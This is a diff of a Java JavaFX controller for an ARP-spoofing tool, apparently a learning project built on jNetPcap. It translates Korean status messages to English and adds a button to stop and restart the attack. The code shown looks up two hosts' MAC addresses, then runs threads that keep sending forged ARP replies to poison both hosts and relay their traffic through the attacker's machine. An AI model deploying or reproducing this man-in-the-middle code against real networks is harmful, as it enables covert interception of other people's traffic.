@@ -52,9 +52,20 @@ public class Controller implements Initializable {
 	@FXML
 	private Button getMACButton;
 	
+	@FXML
+	private Button stopButton;
+	
 	ObservableList<String> networkList= FXCollections.observableArrayList();
 	
 	private ArrayList<PcapIf> allDevs = null;
+	
+	private int Packet_Relaying = 0;
+	
+	private int ARP_Reply_sender = 0;
+	
+	private int ARP_Reply_target = 0;
+	
+	private int n =0; // packet relay 횟수
 	
 	@Override
 	public void initialize(URL location, ResourceBundle resources) {
@@ -62,9 +73,9 @@ public class Controller implements Initializable {
 		StringBuilder errbuf = new StringBuilder();
 		int r = Pcap.findAllDevs(allDevs, errbuf);
 		if (r==Pcap.NOT_OK|| allDevs.isEmpty()) { //pcap 에러 또는 allDevs가 비었을 때
-			textArea.appendText("네트워크 장치를 찾을 수 없습니다.\n"+errbuf.toString()+"\n");
+			textArea.appendText("This network device doesn't find :(\n"+errbuf.toString()+"\n");
 		}
-		textArea.appendText("네트워크 장치를 찾았습니다.\n원하시는 장치를 선택해주세요.\n");
+		textArea.appendText("Select your network device.\n");
 		for(PcapIf device : allDevs) {
 			networkList.add(device.getName() + " " + ((device.getDescription() != null)? device.getDescription() : "설명 없음" ));
 		}
@@ -87,16 +98,16 @@ public class Controller implements Initializable {
 		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
 		
 		if(Main.pcap == null) {
-			textArea.appendText("네트워크 장치를 열 수 없습니다.\n"+errbuf.toString()+"\n");
+			textArea.appendText("This network device doesn't work :(\n"+errbuf.toString()+"\n");
 			return;
 		}
-		textArea.appendText("장치 선택: "+ Main.device.getName() + "\n");
-		textArea.appendText("네트워크 장치를 활성화했습니다.\n");
+		textArea.appendText("Network device: "+ Main.device.getName() + "\n");
+		textArea.appendText("This network device be enable :)\n");
 	}
 	
 	public void getMACAction() {
 		if(!pickButton.isDisable()) {
-			textArea.appendText("네트워크 장치를 먼저 선택해주세요.\n");
+			textArea.appendText("Please select a network device first. :(\n");
 			return ;
 		}
 		ARP arp = new ARP();
@@ -114,7 +125,7 @@ public class Controller implements Initializable {
 			Main.targetIP = InetAddress.getByName(targetIP.getText()).getAddress();
 			
 		}catch(Exception e) {
-			textArea.appendText("IP 주소가 잘못되었습니다.\n");
+			textArea.appendText("Invalid IP address.\n");
 			return ;
 		}
 		myIP.setDisable(true);
@@ -128,13 +139,13 @@ public class Controller implements Initializable {
 		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
 			System.out.println(Main.pcap.getErr());
 		}
-		textArea.appendText("타겟에게 ARP Request를 보냈습니다 .\n" + Util.bytesToString(arp.getPacket()) +"\n");
+		//textArea.appendText("타겟에게 ARP Request를 보냈습니다 .\n" + Util.bytesToString(arp.getPacket()) +"\n");
 		
 		long targetStartTime = System.currentTimeMillis();
 		Main.targetMAC = new byte[6];
 		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
 			if(System.currentTimeMillis() - targetStartTime >= 500) {
-				textArea.appendText("타겟이 응답하지 않습니다.");
+				textArea.appendText("Target is not responding.");
 				return;
 			}
 			PcapPacket packet = new PcapPacket(header, buf);
@@ -152,7 +163,7 @@ public class Controller implements Initializable {
 			}
 			
 		}
-		textArea.appendText("타겟 맥 주소: " + Util.bytesToString(Main.targetMAC) + "\n");
+		textArea.appendText("Target Mac Address: " + Util.bytesToString(Main.targetMAC) + "\n");
 		
 		
 		arp = new ARP();
@@ -161,13 +172,13 @@ public class Controller implements Initializable {
 		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
 			System.out.println(Main.pcap.getErr());
 		}
-		textArea.appendText("센더에게 ARP Request를 보냈습니다 .\n" + Util.bytesToString(arp.getPacket()) +"\n");
+		//textArea.appendText("센더에게 ARP Request를 보냈습니다 .\n" + Util.bytesToString(arp.getPacket()) +"\n");
 		
 		long senderStartTime = System.currentTimeMillis();
 		Main.senderMAC = new byte[6];
 		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
 			if(System.currentTimeMillis() - senderStartTime >= 500) {
-				textArea.appendText("센더가 응답하지 않습니다.");
+				textArea.appendText("Sender is not responding.");
 				return;
 			}
 			PcapPacket packet = new PcapPacket(header, buf);
@@ -185,21 +196,39 @@ public class Controller implements Initializable {
 			}
 			
 		}
-		textArea.appendText("센더 맥 주소: " + Util.bytesToString(Main.senderMAC) + "\n");
+		textArea.appendText("Sender Mac Address: " + Util.bytesToString(Main.senderMAC) + "\n");
 		
 		new SenderARPSpoofing().start();
 		new targetARPSpoofing().start();
 		new ARPRelay().start();
     }
+	public void stopAction() {
+		if(Packet_Relaying ==1 && ARP_Reply_sender == 1 && ARP_Reply_target == 1) {
+			Packet_Relaying = 2;
+			ARP_Reply_sender = 2;
+			ARP_Reply_target = 2;
+			textArea.appendText("Packet Relay Stop!\n");
+		}
+		else if(Packet_Relaying  ==2 && ARP_Reply_sender == 2 && ARP_Reply_target == 2) {
+			new SenderARPSpoofing().start();
+			new targetARPSpoofing().start();
+			new ARPRelay().start();
+			n++;
+			textArea.appendText("Packet Relay...("+Integer.toString(n)+")\n");
+		}
+	}
 	
 	class SenderARPSpoofing extends Thread{
 		@Override
 		public void run() {
 			ARP arp = new ARP();
 			arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, Main.targetIP, Main.senderMAC, Main.senderIP);
-			Platform.runLater(()-> {textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다\n");
-			});
-			while(true) {
+			if(ARP_Reply_sender ==0) {
+				Platform.runLater(()-> {textArea.appendText("Sender ARP Reply...\n");
+				});
+			}
+			ARP_Reply_sender = 1;
+			while(ARP_Reply_sender == 1) {
 				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
 				Main.pcap.sendPacket(buffer);
 				try {
@@ -216,9 +245,12 @@ public class Controller implements Initializable {
 		public void run() {
 			ARP arp = new ARP();
 			arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, Main.senderIP, Main.targetMAC, Main.senderIP);
-			Platform.runLater(()-> {textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다\n");
-			});
-			while(true) {
+			if(ARP_Reply_target == 0) {
+				Platform.runLater(()-> {textArea.appendText("Target ARP Reply...\n");
+				});
+			}
+			ARP_Reply_target = 1;
+			while(ARP_Reply_target == 1) {
 				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
 				Main.pcap.sendPacket(buffer);
 				try {
@@ -237,12 +269,15 @@ public class Controller implements Initializable {
 			Ip4 ip = new Ip4();
 			PcapHeader header = new PcapHeader(JMemory.POINTER);
 			JBuffer buf = new JBuffer(JMemory.POINTER);
+			if(Packet_Relaying == 0) {
 			Platform.runLater(() -> {
-				textArea.appendText("ARP Relay를 진행합니다\n");
-			});
+				textArea.appendText("Packet Relay...\n");
+				});
+			}
+			Packet_Relaying = 1;
 			
 			
-			while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
+			while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK && Packet_Relaying == 1 ) {
 				PcapPacket packet = new PcapPacket(header, buf);
 				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
 				packet.scan(id);
@@ -285,7 +320,7 @@ public class Controller implements Initializable {
 					}
 				}
 			}
-				System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
+				//System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
 			}
 		}
 	}
